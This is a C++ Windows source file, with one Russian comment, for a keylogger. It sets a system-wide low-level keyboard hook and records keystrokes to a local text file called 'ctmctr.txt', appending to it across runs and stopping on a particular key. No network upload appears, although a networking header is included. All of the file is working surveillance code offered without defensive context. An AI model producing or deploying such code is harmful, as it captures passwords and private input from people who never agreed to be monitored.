#include "stdafx.h"
#include <iostream>
#include <fstream>

#include <stdio.h>
#include <wininet.h>


HFILE f;
HHOOK hKeyHook;
KBDLLHOOKSTRUCT kbdStruct;

void append(HFILE f1) // перемешает указатель в конец  файла
{
	WIN32_FIND_DATAA fData;
	HANDLE h = FindFirstFileA("ctmctr.txt", &fData);
	_llseek(f1, fData.nFileSizeLow, 0);
}

LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{

	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)))
	{
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		char s[10];
		char c;
		c = (unsigned char)kbdStruct.vkCode;
		if ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))
		{
			if (c == 32 || c >= 48 && c <= 57 || c >= 65 && c <= 91)
			{
				s[0] = c;
				_lwrite(f, s, 1);
			}
			else if (c == -64)
			{
				s[0] = '`';
				_lwrite(f, s, 1);
			}
			else if (c == -69)
			{
				s[0] = 'E';
				s[1] = 'X';
				s[2] = 'I';
				s[3] = 'T';
				_lwrite(f, s, 4);
				PostQuitMessage(0);
			}
		}
	}

	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{

	f = _lopen("ctmctr.txt", 1);
	if (f == -1) f = _lcreat("ctmctr.txt", 0); else append(f);

	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

	UnhookWindowsHookEx(hKeyHook);

	_lclose(f);

    return (int) msg.wParam;
}
